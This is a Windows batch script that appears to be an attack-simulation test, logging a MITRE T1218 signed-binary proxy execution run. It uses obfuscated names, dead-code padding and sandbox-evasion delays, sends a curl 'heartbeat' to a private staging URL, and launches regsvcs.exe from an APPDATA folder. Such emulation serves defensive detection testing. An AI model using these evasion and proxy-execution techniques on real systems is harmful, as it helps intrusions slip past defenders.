@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET xmvlqp=%APPDATA%\8253\3cc46f7a
SET zbjhyrt=https://10.0.0.49
SET nkdlwxg=https://10.0.0.49/stage/2/icon.png?8253-7
SET pvfgqjt=ITZEL-S2BO
SET yhrcmnk=7
SET wbsknlc=dxdiag.txt
SET tjzqpdv=8253

SET logpath=%APPDATA%\!yhrcmnk!\macula-simulations.log
SET agentvar=!pvfgqjt!
SET state=0

GOTO srthkq

:junk_fpwcw
REM Dead code - never reached
SET deadvar=unused
EXIT /B 1

:srthkq
REM Dispatch state machine
IF !state!==0 GOTO vtqmkr
IF !state!==17 GOTO wxnjfc
IF !state!==42 GOTO bmzrkl
IF !state!==99 GOTO zbckyp
GOTO hkymxw

:dead_snpdc
REM Unreachable dead code
SET garbage=junkdata
GOTO zbckyp

:vtqmkr
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=initial>>> "!logpath!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_end=initial>>> "!logpath!" 2>nul

SET /A rnddelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=random_!rnddelay!s>>> "!logpath!" 2>nul
timeout /t !rnddelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_end=random>>> "!logpath!" 2>nul

SET state=17
GOTO srthkq

:junk_vfjty
REM Dead code block
SET fk1=test
SET fk2=data
GOTO zbckyp

:wxnjfc
echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_start>>> "!logpath!" 2>nul
curl -k -s -o nul "!nkdlwxg!"
SET result=1
SET errdetail=
IF NOT !errorlevel!==0 (
    SET result=0
    SET errdetail=curl_failed_!errorlevel!
)
echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_end>>> "!logpath!" 2>nul
echo [!DATE!!TIME!.000][!agentvar!]: !yhrcmnk!-!tjzqpdv!-T1218|Signed Binary Proxy Execution=!result!::!errdetail!>> "!logpath!" 2>nul

echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=pre_cd>>> "!logpath!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_end=pre_cd>>> "!logpath!" 2>nul

SET state=42
GOTO srthkq

:dead_rfnbg
REM Never executed code
SET fkvar=deadvalue
GOTO zbckyp

:bmzrkl
echo [!DATE! !TIME!][DEBUG][!agentvar!]: chdir_start=!xmvlqp!>>> "!logpath!" 2>nul
cd /d "!xmvlqp!"
SET result=1
SET errdetail=
IF NOT !errorlevel!==0 (
    SET result=0
    SET errdetail=chdir_failed_!errorlevel!
)
echo [!DATE! !TIME!][DEBUG][!agentvar!]: chdir_end>>> "!logpath!" 2>nul

IF 1==1 (
    GOTO real_exec
) ELSE (
    GOTO fake_exec
)

:fake_exec
REM Dead branch
SET fakecmd=never_run
EXIT /B 0

:junk_mqspl
REM Interleaved dead code
SET junk1=unused
SET junk2=unused
GOTO zbckyp

:real_exec
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=pre_exec>>> "!logpath!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_end=pre_exec>>> "!logpath!" 2>nul

echo [!DATE! !TIME!][DEBUG][!agentvar!]: exec_start=regsvcs.exe>>> "!logpath!" 2>nul
regsvcs.exe "!wbsknlc!"
SET result=1
SET errdetail=
IF NOT !errorlevel!==0 (
    SET result=0
    SET errdetail=exec_failed_!errorlevel!
)
echo [!DATE! !TIME!][DEBUG][!agentvar!]: exec_end=regsvcs.exe>>> "!logpath!" 2>nul
SET state=99

GOTO hkymxw

:dead_kpjxy
REM Unreachable
SET deadvar=morejunk
GOTO zbckyp

:hkymxw
REM Transition through intermediate label
IF !state!==99 GOTO fjmwkq
GOTO zbckyp

:fjmwkq
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=final>>> "!logpath!" 2>nul
timeout /t 10 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_end=final>>> "!logpath!" 2>nul
GOTO zbckyp

:junk_vncwt
REM Final dead code block
SET lastjunk=end

:zbckyp
echo [!DATE! !TIME!][DEBUG][!agentvar!]: script_complete>>> "!logpath!" 2>nul
ENDLOCAL